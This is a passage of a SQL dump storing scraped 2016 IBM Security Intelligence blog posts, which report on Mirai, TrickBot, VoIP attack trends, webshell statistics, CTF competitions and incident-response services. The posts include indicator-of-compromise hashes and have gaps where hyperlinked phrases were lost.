simply do not have the time to chase all the false positives. There is a third set of algorithms known as semi-supervised. This set uses some labeled data and some unlabeled data. In a typical case, one of the classes of data is labeled and others are not. For example, the system may be exposed to labeled normal data and other data that may be either normal or attack data. In this scenario, the semi-supervised algorithm tries to find commonalities in the features of the labeled data, then tries to identify and label data from the rest of the data set. One way to solve the problem of data labeling is to introduce a human into the training loop.   by labeling attack data and perhaps normal data as well. They then teach the algorithm and create supervised data that can be used to train the next iteration of the machine learning system. This technique is extremely powerful but often underutilized due to the push to create the perfect unsupervised machine learner. But human expertise may be the only way to teach an effective anomaly detector. The goal of a machine learning system such as an anomaly detector should be to augment, not replace, the human analyst. Analysts have to sort through a massive amount of supposed attacks, often generated by signature-based detectors, which only identify known attacks. This leads to high rates of missed attacks — false negatives — and attackers simply learn how to avoid the detectors. Furthermore, to reduce the amount of false positives the analyst must reject, detectors are often tuned so that only certain signatures set off alerts. If a signature produces a high false positive rate, it is often noted but not analyzed. A machine learning system should help to eliminate the false positives and indicate attacks not identified by signatures. This would give the analyst a more holistic view of the strikes attempted against a network or host. AI2, created by authors at MIT and PatternEx, attempts to be just such a system. It is described as an “analyst-in-the-loop” technology designed to improve detection rates by a factor of 3.41 and reduce false positives by a factor of five compared to an unsupervised detector. We’ll examine AI2 more completely in the next part of this series.', '\'Cognitive Computing\', \'Cognitive Security\', \'False Positives\', \'Machine Learning\', \'Threat Detection\', \'Threat Intelligence\'', 'https://securityintelligence.com/with-ai2-machine-learning-and-analysts-come-together-to-impress-part-1-an-introduction/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (161, 'Mirai Evolving: New Attack Reveals Use of Port 7547', 'Lyndon Sutherland', '2016-12-1', 'When the source code for the Mirai botnet was   in late September, a top concern was that bad actors might modify the code to increase the number of Internet of Things (IoT) devices they can compromise. It seems these fears have been realized. A few weeks ago,   disclosed a vulnerability in the Eir D1000 modem that could enable a remote attacker to take control of an affected device. Devices can be compromised remotely using Transmission Control Protocol (TCP) port 7547. It didn’t take long for malicious actors to modify the Mirai botnet source code to exploit this vulnerability. This past weekend, customers of   were targeted in a worldwide attack. While the company reported that the attack largely failed to compromise the targeted devices, it did cause problems for some 900,000 customers. Deutsche Telekom made updates to mitigate the vulnerability. Below is a screenshot of the port metric data from our Nov. 28 edition of the   client newsletter. The graphic highlights the top five most commonly used ports over a 24-hour period. Not even a blip on our radar last week, scanning for vulnerable devices on TCP port 7547 has appeared to suddenly ramp up over last weekend. As of Nov. 29, the number of packets observed by TCP port 7547 remained high, second only to TCP port 23 (Telnet), which, along with TCP port 2323, Mirai has historically used to compromise vulnerable IoT devices. Additionally, data from   globally deployed sensors showed that at least one of the IP addresses known to be associated with this attack has been sequentially crawling the internet address space. The   port metrics showed a similar story, with a major uptick in port 7547 occurring on Nov. 26. It also provided   on the attacks, including indicators of compromise (IOCs) such as the following hashes of the binary files used in the attacks: 7e84a8a74e93e567a6e7f781ab5764fe3bbc12c868b89e5c5c79924d5d5742e2 \n7e84a8a74e93e567a6e7f781ab5764fe3bbc12c868b89e5c5c79924d5d5742e2 \n1fce697993690d41f75e0e6ed522df49d73a038f7e02733ec239c835579c40bf \n828984d1112f52f7f24bbc2b15d0f4cf2646cd03809e648f0d3121a1bdb83464 \nc597d3b8f61a5b49049006aff5abfe30af06d8979aaaf65454ad2691ef03943b \n046659391b36a022a48e37bd80ce2c3bd120e3fe786c204128ba32aa8d03a182 \n5d4e46b3510679dc49ce295b7f448cd69e952d80ba1450f6800be074992b07cc Although Mirai has been out of the news lately, it has not gone away. If the cybergang behind the attacks is able to increase the number of devices in the Mirai botnets, we may be reading plenty about it soon. Apply software updates as soon as possible to mitigate the threat of exploitation and embrace security best practices to prevent your   from becoming part of a massive botnet. You can also track the development of this threat by visiting the   collection on IBM X-Force Exchange.', '\'Advanced Threats\', \'Connected Devices\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Internet of Things (IoT)\', \'X-Force\'', 'https://securityintelligence.com/mirai-evolving-new-attack-reveals-use-of-port-7547/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (162, 'Don’t Blink! TrickBot Now Targets 10 German Savings Banks', 'Limor Kessem', '2016-12-1', 'IBM X-Force researchers following the development of the   noted that the malware is rapidly adding new targets and attack capabilities and has now officially advanced into Germany. The most recent additions to TrickBot’s configurations target 10 savings banks in the European country. At this time, TrickBot is configured to use   on the targeted banks. Although TrickBot’s initial configurations featured only one bank in Germany, that has since changed. Now, with a total of 10 banks on its attack roster, it is clear that the malware’s operators invested in adapting spam and infection tools, as well as the webinjection attacks, to German-speaking customers. The fact that TrickBot is only targeting savings banks raises the possibility that the criminals operating it have found a vulnerability common to those banks’ digital platforms or transaction authorization processes. The German bank targets are reminiscent of  , during which the Trojan targeted numerous banks in the country, many of which were co-operative banks. GozNym itself has been   since August 2016. Germany, a founding member of the European Union (EU), is the largest national economy in Europe and the   by nominal gross domestic product (GDP) in the world. According to a  , cybercrime taxes the global economy with about 0.8 percent in relation to GDP. Germany suffers twice that rate — 1.6 percent. Since the country’s GDP was   in 2015, cybercrime in the country may outpace its annual growth, which was 1.5 percent in 2015. This could potentially amount to $61.4 billion in losses. In 2014, KPMG estimated that cybercrime losses in the country  . Additionally, a Ponemon Institute study conducted in 2015   on the list of countries where businesses see the highest losses from cybercriminal attacks. German companies lost an average of $7.5 million in each attack. X-Force researchers indicated that members of German underground and Dark Web forums prolifically discuss banking and payment card fraud. The German underground is also replete with traders and peddlers of crimeware, accomplice searches, cybercrime services and fraud commodities sold by local criminals or Russian-speaking actors. \n The month of November has been a busy one for TrickBot, with its operators actively building new configurations and fake websites to   on the malware’s targets. IBM X-Force researchers have observed this heightened activity across other financial malware families as well, with a flurry of campaigns launched by different gangs. Aside from TrickBot, other financial malware families appear to be gearing up for the holiday season. The Gozi Trojan has been quite active since late October, and malware such as Dridex, Qadars and Ramnit have been attempting to infect new users. Researchers also detected other notable campaigns in November that delivered Kronos as a point-of-sale (POS) malware carrier. Additionally, it looks like QakBot, an old threat, is making a comeback of sorts. QakbBot is a banking Trojan of which X-Force researchers have been aware since 2009. It is a worm that can spread through networks shares. As such, QakBot was one of the first banking Trojans to target business bank accounts, which is a notable trend nowadays. TrickBot only just emerged as financial malware in October 2016, but its development is rapid, its capabilities are advanced and it is likely linked to other cybercrime gangs. Although the information security media has already begun to cover it, TrickBot is likely just beginning, setting up to launch much larger campaigns. IBM X-Force researchers see TrickBot as one of the threats to watch for in 2017. It may well advance its attack methods to match Dyre’s, especially when it comes to  . IBM X-Force made TrickBot indicators of compromise (IOCs) available on  . Just type “TrickBot” into the search bar to find all related collections on this malware. Your team can add to the TrickBot collections by anonymously sharing additional IOCs on X-Force Exchange. This will ultimately help information security professionals fight cybercrime threats closer to real time, cutting malware’s lifelines. Banks wishing to protect their customers from evolving threats and cybercrime modus operandi are invited to learn more about  . Individuals looking to protect themselves from malware like TrickBot and other banking Trojans are invited to read our  .', '\'Advanced Threats\', \'Banking\', \'Banking Trojan\', \'Germany\', \'GozNym\', \'IBM X-Force Research\', \'Malware\', \'TrickBot\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/dont-blink-trickbot-now-targets-10-german-savings-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (163, 'Hello, You’ve Been Compromised: Upward Attack Trend Targeting VoIP Protocol SIP', 'Michelle Alvarez', '2016-11-30', 'There are   used in voice-over-IP (VoIP) communications. According to   data, the most targeted VoIP protocol is Session Initiation Protocol (SIP), which accounted for over 51 percent of the security event activity analyzed in the last 12 months. \n SIP is one of the most commonly used application layer protocols in VoIP technology, so it’s not surprising that it’s the most targeted. In fact, we found that there has been an upward trend in attacks targeting the SIP protocol, with the most notable uptick occurring in the second half of 2016. \n In actual attacks on VoIP communications, we note various types of disruption. Spikes in July and September were mostly the result of specially crafted SIP messages that were terminated incorrectly. Persistent, invalid messages are known to cause vulnerable servers and equipment to fail. The spike in October 2016 was largely influenced by SIP messages with invalid characters in the SIP “To” field. These could be reflective of suspicious activity, necessitating further investigation. The second most targeted protocol, Cisco’s proprietary Skinny Client Control Protocol (SCCP), accounted for just over 48 percent of detected security events during the same time period. SCCP is a lightweight, IP-based protocol used for communication between Cisco Unified Communications Manager and Cisco VoIP phones. Unlike attacks targeting SIP, those targeting the SCCP protocol have been declining slightly over the past 12 months. \n A large majority of the security events targeting the SCCP protocol — nearly 74 percent — are actually pre-attack probes that enable the perpetrators to examine device capabilities and gather information on potential targets. Finally, the H225 protocol, which is part of the H.323 protocol suite, accounted for less than 1 percent of the activity — barely a blip on the first chart. According to  , the global VoIP services market will expand at a 9.7 percent compound annual growth rate (CAGR) between 2014 and 2020. As businesses and consumers adopt VoIP to reduce costs, are they also introducing unforeseen risks? When it comes to unsolicited information, we’ve gotten pretty good at dealing with or   in our inbox. But what about spam over internet telephony (SPIT), also known as VoIP spam? These unsolicited, automated phone calls made from internet-provided numbers are just as annoying as junk mail. Since it is connected to the same pipes as spam, so to speak, VoIP technology has aided the proliferation of robocalls, allowing scammers to make illegal calls from anywhere in the world. It floods consumers and businesses with marketing calls, surveys and even identity theft scams, also known as vishing. Unfortunately, stopping these calls is not as easy as flagging unsolicited email. Despite a   in June 2015 that gave U.S. telecommunication companies permission to provide robocall-blocking technology to consumers, the problem does not seem to be subsiding. In fact, the   hosted a contest at DEF CON that challenged contestants to create a solution to automatically block and forward robocalls to a research honeypot. In May 2016, the   reported that it expected the FTC to receive more than 3.3 million complaints concerning robocalls in 2016. The FCC provided a   to help consumers stop these annoying or even fraudulent robocalls. Beyond the irritation factor, attackers have found additional ways to capitalize on VoIP technology that pose a higher risk to both consumers and businesses. Because VoIP routes calls through the same paths used by network and internet traffic, it is also subject to some of the same vulnerabilities and threats cybercriminals use to exploit these networks. VoIP traffic can thus be intercepted, captured or modified and is subject to attacks aimed at degrading or eliminating service. VoIP technology allows malicious individuals to conduct caller ID spoofing with minimal cost and effort. This enables attackers to obtain information or facilitate additional scams against their targets. A February report, for example, highlighted issues with certain VoIP phones that had  , which allowed attackers to make, receive and transfer calls, play recordings, upload new firmware and even use victims’ devices for covert surveillance. VoIP services are also subject to abuses such as toll fraud, which involves taking control of network access to avoid paying for telephone calls. VoIP phone consumers should avoid blindly relying on the manufacturer’s default security settings and use strong passwords. An attacker can carry out a distributed denial-of-service (DDoS) attack by flooding a company’s telephone service with thousands of junk calls per minute from automated IP dialers. A phone DDoS attack could cripple an organization that relies heavily on its phone systems. The method has even been used to   after large sums of money were stolen from their bank accounts. VoIP risks extend beyond spam and eavesdropping. These phones connect a large variety of devices, and cybercriminals can weaponize any internet-connected corporate or consumer device. It’s imperative that organizations and consumers take the following steps to  : Exploiting VoIP vulnerabilities and weaknesses may be an old-school cybercriminal trick, but given the rise in attacks targeting the SIP protocol, it’s clear that this tried-and-true threat is still at large.', '\'Cisco\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'Voice-Over-IP (VoIP)\', \'X-Force\'', 'https://securityintelligence.com/hello-youve-been-compromised-upward-attack-trend-targeting-voip-protocol-sip/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (164, 'Cybersecurity Meets Gamification at CTF Competitions', 'Jason Flood', '2016-11-30', 'So you think you understand cybersecurity? You’ve got a   that work with you daily and you believe in them. How sure are you that they are the best? Have you ever wondered how strong their cyber kung fu is — or your own, for that matter — against the pressurized, melting pot environment of the capture-the-flag (CTF) cyber arena? , but it’s a serious game. It has two main formats, often referred to as Jeopardy and attack/defense. Personally, I prefer the Jeopardy challenges. These come in many variants, and they can be fun and lighthearted or hard-hitting and technically difficult. The main attraction of the Jeopardy style is the opportunity to challenge the audience. With such a broad scope of possible attack scenarios available to the creator, the inventiveness of the Jeopardy challenge is limited only by the author’s imagination and skill set. But why points? Why challenges? The purpose of CTF competitions are to simulate real-world scenarios across a gamified platform, which is complete with a mechanism for awarding points. This is typically based on speed to solve, difficulty or some combination of the two. The scores for all challenges solved in a CTF are combined to determine the winner. CTFs are typically team-based, and teams vary in size. My preference is limit teams to four players, which allows for a more even spread of activities and work. It tests communication, teamwork and a range of other soft skills. With the right mix, a team can really excel. There are many CTF competitions, possibly even in your local community. I got into CTFs around seven years ago while attending security conferences and listening to talks. While listening to a rather boring session, I discovered a CTF available online. I decided to try it to kill 30 minutes. Eight hours later, I had caught the bug. Although I performed very poorly at first, I met some great people and exchanged skills. We eventually formed a team, had some success and started running our own CTF competitions. In the past, we’ve delivered CTF competitions for the Open Web Application Security Project (OWASP) community. We are currently working on an event for the Irish Reporting and Information Security Service (IRISS) in Dublin. Additionally, IBM recently   in Boston — the Disneyland of cyber kung fu tests. Check out this   to learn more. As a CTF organizer, I am often asked what the barrier to entry is. My honest answer is that attitude is the most critical factor. Get your mindset right, and the skills will follow.', '\'Cyberdefense\', \'Cybersecurity\', \'Education\', \'IBM Cyber Range\', \'Skills Gap\'', 'https://securityintelligence.com/cybersecurity-meets-gamification-at-ctf-competitions/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (165, 'TrickBot Redirection Attacks Launched in Canada', 'Limor Kessem', '2016-11-23', 'The  , which emerged in the wild only this summer, continues to widen its attack scope, spreading farther in its target geographies and developing new  . The most recent additions to TrickBot’s redirection targets are three Canadian banks. According to   researchers following the TrickBot Trojan’s ongoing  , the malware operators frequently release new configurations. The gang continues to focus on the U.K. and Australia, but it’s now setting its sights on Canada with enhanced capabilities to attack banks in the country. TrickBot is the fourth known gang-operated banking Trojan to bring redirection attacks to Canada. Redirection attacks first targeted Canadian banks in 2015, when the Dyre malware launched its nefarious web browser manipulation techniques. At the time, Dyre targeted business accounts of a handful of banks in Canada. After Dyre’s disappearance, the   started using redirections against businesses in Canada. Next,   created redirection attacks designed to  , and now TrickBot is entering that same turf. This matters because the only malware operators with the extra resources to build and carry out redirection attacks are the top-known organized cybercrime gangs in the fraud arena today. The fact that all these heavy hitters invest in attacks specific to Canadian banks suggests that they’ll see  , more potential fraud and a level of operational sophistication comparable to organized crime. These mob-style cybercrime gangs are higher up on the food chain of online fraud than other malware operators, and they are nothing short of devastating to individuals and businesses. To make stolen funds disappear, gangs keep elaborate crews on their payroll, maintaining a large number of foot soldiers to funnel stolen money from one account to another and either act as money mules to cash the funds out. Recent events in the news, such as the   who were caught in October with access to more than 220 compromised U.K. bank accounts and £2.5 million, bring the concept to life. In a larger case made public in November, authorities arrested 14 ex-Dyre and ex-Dridex members who laundered over $13 million in the past two years. In both cases, only the low-level crooks linked with these gangs’ activity were apprehended. Given the rising threat from the most sophisticated malware gangs, it’s surprising that the Canadian government   a federal reporting agency for financial cybercrime. This makes it rather difficult to tally specific complaints and losses. Overall, statistics from previous years are alarming: Canadian police observed a   around the country between 2011 and 2013. That number has likely risen in the three years since. Canadian businesses are also struggling with other types of cyberattacks. According to the Ponemon Institute’s “ ,” Canada suffered the highest detection and escalation costs. The cost of a breach rose 12.5 percent for Canadian companies, and the average total cost of a breach was $6.03 million in 2016. Canada weathers attacks from similar cybercrime groups as those observed on the global map. Commercial malware factions top the chart, followed by the organized crime groups that operate malware such as GootKit, Dridex, URLZone, GozNym and others. At this time, TrickBot’s activity in Canada is only beginning, but the malware is advancing rapidly and aggressively, according to X-Force researchers. TrickBot’s operators appear to be connected to well-known   and infection services, use redirection attacks and seem to have some ties to the Dyre crew. For this reason, we expect to see this malware’s activity increase during the holiday season and into 2017. For TrickBot indicators of compromise (IOCs), check out — and share — via  . Banks looking for technology solutions to mitigate threats like TrickBot and other sophisticated malware are invited to learn more about the  . As always, users should   to mitigate threats like the TrickBot Trojan and reduce risk.', '\'Banking Trojan\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Information Sharing\', \'Malware\', \'Threat Intelligence\', \'TrickBot\', \'X-Force\'', 'https://securityintelligence.com/trickbot-redirection-attacks-launched-in-canada/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (166, 'Episode 003: To the Command Center', 'Rob Patey', '2016-11-23', 'Now that EveryApp has seen the Pandapocalypse attacks occur in real time, will they need to sing another chorus of “Where do we go from here?” next episode? Most likely! Network and IT security is no longer a point solution placed on the perimeter. It’s no longer one simple scenario that has a linear playbook of answers. Today’s malicious actors are attackers on all fronts of the ever-expanding enterprise. When businesses make a move to enable themselves with new technology, those that would cause harm won’t be far behind in exploiting any open and available sieves. The EveryApp team made the right call to visit the Cambridge Command Center to assess the current threat landscape and learn the steps toward rapid remediation. But tomorrow will be a different day. What about your organization? Are you prepared for today’s threats? What about tomorrow’s unknowns? Interested in learning more about how IBM’s X-Force Command Centers will help clients stay ahead of the most advanced threats? You can:', '\'Command Center\', \'IBM Cyber Range\', \'IBM Security\', \'IBM X-Force Command Center\', \'In Security\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/in-security-web-comic-episode-003-to-the-command-center/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (167, 'A Year in Collaborative Defense With IBM Security App Exchange', 'Chris Meenan', '2016-11-22', 'IBM launched its   at the tail end of 2015, so it has been live for almost a year now. We always thought the App Exchange had significant potential, but we’ve been blown away by its success with our customers and other security vendors. We now have security information and event management (SIEM) customers imploring other vendors to provide a QRadar app as a prerequisite to joining their security operations. It has also helped IBM demonstrate its   in a tangible way.\n The program has been so successful that we passed our 12-month target for third-party vendors and apps on the Exchange after only seven months. We are currently seeing approximate monthly totals of:\n These numbers illustrate the App Exchange’s value to IBM customers, partners and the overall market. We’ve also trained over 90 security vendors in app development and have a vibrant backlog of third-party and IBM apps that we are planning to launch over the next few months.\n One thing that was clear from the outset was the wide variety of security operations that the apps are addressing. This offers some interesting insights into what products are hot in the security market. While the IBM Security App Exchange is product-agnostic, it is currently dominated by apps for the  , followed by   and  . Because QRadar sits right in the center of organizations’ threat detection and response processes, most systems involved in security operations should interface with it in some way.\n Since the App Exchange launched, we’ve added over 70 apps that fall into the following broad categories:\n The first set of stats shows the relative number of apps on the App Exchange in each category. Apps that fall into the categories of Threat Detection Use Cases and Compliance Use Cases account for more than half the offerings. Demand is high because these are the first use cases that most organizations address when implementing security operations.\n The third most common set of apps fall into the category of  . The market is piping hot for these apps due to the fact that more than 50 percent of threats fall into this category. Demand for apps that fall into the Threat Intelligence category is similarly high.\n \n The second set of stats show the relative ratio of app downloads in each category. Again, the top category is Threat Detection Use Cases. This is very closely followed by User Behavior Analytics, with both Visualizations and Threat Intelligence hot on its heels. It’s interesting that Visualizations ranks so high in downloads while the category includes a relatively small set of apps. This may represent an unmet need.\n Of course, download statistics are skewed by the length of time some apps have been available on the App Exchange.  , for example, has only been available for four months, but is already the third most downloaded app. Some newer apps in the areas of Endpoint Detection and Response, Incident Response and Hunting, while low in volume and relative downloads, are growing quickly. It’ll be interesting to review this trend in another six months to a year.\n \n In summary, the key insights we can take away from this data are:\n That’s just a sampling of the insights we can draw from the App Exchange statistics. We’ll continue to track the App Exchange’s development and shine a light on what apps are gaining traction in the market. Stay tuned!', '\'Application Security\', \'IBM Security\', \'IBM Security App Exchange\', \'IBM Security QRadar\', \'X-Force\'', 'https://securityintelligence.com/a-year-in-collaborative-defense-with-ibm-security-app-exchange/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (168, 'It’s Time for the Democratization of Cybersecurity Data', 'Caleb Barlow', '2016-11-21', 'There is little question that the perpetrators of cyberthreats spend little time thinking inside the box — that’s how they stay ahead of their victims. It’s time for some out-of-the-box thinking of our own to get serious about fighting back. It’s time for the democratization of cybersecurity data. Here is the challenge to users, organizations and security vendors alike: First, we should aggressively democratize the threat data we all have and   with each other. Second, we should pivot a full 180 degrees from the accepted practice of automatically classifying, by default, all cyberthreat data. Instead, we should   threat data by default. Hence, the democratization of cybersecurity data. Cybercrime information sharing is nothing new. Unfortunately, the wrong people have been doing the sharing, and they have elevated the practice to a commercial art form. Cooperating and  , the most sophisticated cybercriminals build and peddle attack software to each other. They even have seller ratings and rankings for their malware, with the most effective earning five stars. They offer gold, silver and bronze levels of service — even money-back guarantees if the malicious efforts fail. With thieves as organized and sophisticated as they are, it is a small wonder that estimates of their annual take in   These aren’t amateurs. The United Nations estimated that highly organized, well-funded   today. For these and so many other good reasons, the time is now for businesses, governments and other organizations to elevate cyberthreat information sharing to entirely new levels. The public sector has initiated steps in this direction. Last year the U.S. passed the  . Its goal is to help organizations share cyberthreat information and actual attack data anonymously and without fear of liability. There are massive collections of cybercrime data largely kept under lock and key in individual organizations. Security vendors, including IBM, typically have the largest repositories. Why has it been kept secret? Both security vendors and businesses tend hold onto this data for its perceived competitive value. It is valuable to some extent, but the potential gains of having that much threat data and information can be an even more formidable competitive weapon. After all, it isn’t possessing the data that yields an advantage; it’s what each organization or vendor does with it. This kind of sharing is not new in our business. The whole open source movement that gave us Linux, OpenStack, Hadoop, Spark and so much more resulted from aggressive  . It can be the same with cyberthreat data. Large-scale sharing of threat data will signal a new high water mark in fighting cybercrime. We are walking the walk at IBM, recognizing that we were as much a part of the problem as any other business or organization. That is why IBM published all of its actionable, third-party global threat data — all 700 terabytes of it. This includes real-time indicators of live attacks. We believe the free consumption and sharing of   from our repository can put a sizable dent in cybercrime efforts. Think of what else we can accomplish with the democratization of cybersecurity data. As mentioned earlier, sharing is only one part of the out-of-the-box thinking we need to adopt. We have to share this information as soon as possible, not weeks or months after a major breach. The default action today is to immediately classify such information, rendering it unshareable until it is eventually declassified. Instead, put a timeline on classification of new threat data — maybe 48 or 72 hours, no more. If no valid, justifiable case is made for continued classification within that period, release it to be shared among other organizations. The aforementioned CISA spells out methods for doing this securely so the information doesn’t fall into the wrong hands. We must abandon the Cold War mentality that leads us to classify all information and share nothing. We are all engaged in a very hot war with cybercriminals. Speed matters when it comes to using relevant data to stop active attacks and thwart future threats. Information sharing at the speed of business can be a formidable weapon — we just need to unleash it.', '\'Cybersecurity\', \'IBM\', \'IBM Security\', \'Information Sharing\', \'Threat Intelligence\', \'Threat Protection\'', 'https://securityintelligence.com/its-time-for-the-democratization-of-cybersecurity-data/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (169, 'Ninety-Five Percent of Webshell Attacks Written in PHP', 'Dave McMillen', '2016-11-18', 'There’s nothing inherently malicious about a webshell, which is a script that can be uploaded to a web server to enable remote administration of the machine. In the hands of an attacker, however, they are a serious cyberthreat. Advanced persistent threat (APT) groups often use webshells to breach organizations. Earlier this year, we reported on two notable upticks in webshell attacks:   and  . This activity intrigued our analysts, warranting further investigation. Our subsequent analysis of   data showed an increase in webshell attacks this year, most notably in Q2 and the beginning of Q3. We expect to see that trend continue in 2017. Almost all the attacks — approximately 95 percent — were written in PHP, a widely used open-source scripting language. Although not readily apparent, the number of   resulting from malicious PHP webshells is relatively significant. No other single command injection attack type was observed to be as prevalent, or as persistent, for as long. Analysis of IBM MSS data from 2016 also revealed over 120 unique types of PHP webshell scripts. The great majority were observed in attempts to plant webshell scripts in remote servers via command injection to ultimately breach the servers and gain unauthorized access to the data they host. C99 was the most common variety, accounting for nearly 9 percent of the attacks recorded in 2016. Malicious webshell exploitation is one of the easiest ways attackers can gain unauthorized access to an organization’s network.', '\'Advanced Persistent Threat (APT)\', \'IBM Managed Security Services (MSS)\', \'IBM X-Force Research\', \'PHP\', \'Shellcode\', \'X-Force\'', 'https://securityintelligence.com/ninety-five-percent-of-webshell-attacks-written-in-php/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (170, 'Three Ways Effective Cyber Resilience Helps You Stay Cool in Moments of Chaos', 'John Wheeler', '2016-11-17', 'In case you missed all the excitement yesterday, we proudly held two major events in Cambridge, Massachusetts, and Atlanta, Georgia, where we unveiled the new IBM X-Force Incident Response Intelligence Services (IRIS) team and told the world about our new global  . At both locations, we hosted industry and global thought leaders from government agencies, including the FBI and former counterterrorism leaders, as well as academia. We also hosted our own team of experts in incident response (IR) and managed security services (MSS). It’s straightforward and simple — we are addressing an important fact. It is critical that organizations prepare, prioritize and respond to the  , whether at the hands of highly skilled and motivated external actors or insiders. We too often see the damages exponentially amplified by organizations that lack the proper planning and preparation to take precise and immediate actions when reactions are measured in minutes and hours. Failure to prepare often causes more damage than the attack itself. Clients require innovation combined with expertise in world-class incident response and threat intelligence to detect, contain and prevent attacks quickly enough to minimize impact to customers and operations. We’ve all heard about the   many organizations have faced. The key to reducing the impact of a breach is proactive planning and preparedness. Yesterday’s launch demonstrates IBM’s commitment to helping organizations address their cyberattack readiness and treat it from a multidimensional perspective. With the rising need to organize and respond to cyberattacks such as distributed denial-of-service (DDoS) or ransomware, IT and security leaders need to train like any other defense force. Just like pilots use simulators to train for flight emergencies, the new   is designed to simulate a breach and help teams develop a more effective cyber resilience strategy and coordinated response plan. The Cyber Range delivers simulations of common breaches and sophisticated attack scenarios that bring technical experts and executive decision-makers together, bridging a divide that often leaves organizations temporarily impaired when high-profile incidents occur. The simulation enables teams to practice and learn from their mistakes before they have to face a real breach. Through this type of practice, analysts can become adaptive. This alone can save a significant amount of time in  , which is often the most costly part of a breach. The primary challenge for many organizations in dealing with a breach is often resources. Humans are limited in their ability to analyze and disseminate attack information and to share that information as fast as a network. Given the unprecedented speed and frequency with which cyberattacks are being leveled daily, organizations turn to MSS to combat the magnitude of data flooding their staff and systems. The new   are built to scale global collaboration and integration of intelligence, people and technology to help respond to threats in facilities across Europe, North America, South America and Asia-Pacific. On constant watch, X-Force Command Centers are capable of processing more than 35 billion security events daily for more than 4,500 clients across 133 countries. Our analysts can now tap into  , equipping them with rapid access to large amounts of data unlike any other security operations center on earth. This cognitive advancement represents an important enhancement in speed and data analysis. \n Preparing a proactive and effective cyber resilience strategy can be an unnerving challenge for even the most experienced security teams, especially when developed in the absence of key executive decision-makers across the C-suite. And for those who have assembled a plan, a breach can still occur and take many by surprise. Our newly unveiled  , under the leadership of Wendi Whitmore, brings expertise and services in threat intelligence and forensics to help organizations build comprehensive, proactive incident response, along with establishing threat intelligence and remediation strategies. According to a  , 94 percent of C-level executives believe there is some probability that their company will experience a significant cybersecurity incident in the next two years. They need to be prepared. We think there are several strategies and approaches that can greatly affect the outcome of a future breach. With our   earlier this year, combined with our commitment to growing our portfolio with the  , Cyber Range and IRIS Team, we are dedicated to helping organizations conquer the complexities of incident response and threat intelligence. Like any solid business continuity and disaster recovery plan, cyber resilience requires an investment in rigorous preparation, planning and testing. That way, in moments of chaos, the cool and collected prevail.', '\'Cost of a Data Breach\', \'Incident Response (IR)\', \'Managed Security Services Provider (MSSP)\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/three-ways-effective-cyber-resilience-helps-you-stay-cool-in-moments-of-chaos/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (171, 'IBM X-Force IRIS: Bringing a New Approach to Incident Response', 'Wendi Whitmore', '2016-11-16', 'Today IBM announced the newly formed IBM X-Force Incident Response and Intelligence Services (IRIS) team. This group of exceptionally talented and passionate consultants and analysts is focused on becoming our clients’ trusted security partner. X-Force IRIS experts collaborate with clients to provide solutions for the most challenging information security problems. IBM has made significant investments in   — Watson — to solve the world’s most challenging problems, which is one of the reasons I joined the team earlier this year. Today, we leverage Watson in health care to enhance cancer research and diagnoses throughout the world, in the weather industry to predict the next big storm and in financial services to help manage regulatory compliance. In the future, we will integrate Watson into security technologies to address threat intelligence and   challenges facing companies, their employees and their data. IBM will   to make more informed, timely and accurate decisions to protect the most important intellectual property of today’s businesses. All the members of this formidable team feel fortunate to share a singular passion for keeping attackers away from our clients’ environments. Although simply stated, this mission is a complex, ever-changing solution to the most advanced security issues facing organizations throughout the world. Helping companies save time, money and reputation is valuable — allowing them to focus on their business rather than worry about the next security incident is ideal.  represents a major milestone for IBM Security Services. This will be a transformational security journey with our clients. By most measures, today’s security threats, incidents and breaches are not entirely containable within the timeframes in which we need to prevent the attacker from causing damage. But for organizations with strategic implementation of incident response and intelligence capabilities, risks can be mitigated and negative impact contained to manageable and cost-effective levels. IBM has faced many challenges to stay relevant in its 110-plus years of operations. The introduction of IBM X-Force IRIS is just one more step forward. To achieve the levels of computer   necessary to proactively protect our clients’ most important assets and prevent attacks, we need to offer the next generation of technology. To this end, we are making significant investments in our people, services and solutions to enable all our clients can leverage industry-leading capabilities that detect, respond to and prevent attacks. We look forward to sharing our collective expertise, opinions and unique experiences across security intelligence, incident response and remediation. To learn more about the team, I encourage you to download our  . I am honored to be a part of this exciting group and look forward to providing our clients with a new breed of IBM Security.', '\'Cognitive Security\', \'Incident Response (IR)\', \'Threat Intelligence\', \'Watson\', \'X-Force\'', 'https://securityintelligence.com/ibm-x-force-iris-bringing-a-new-approach-to-incident-response/');
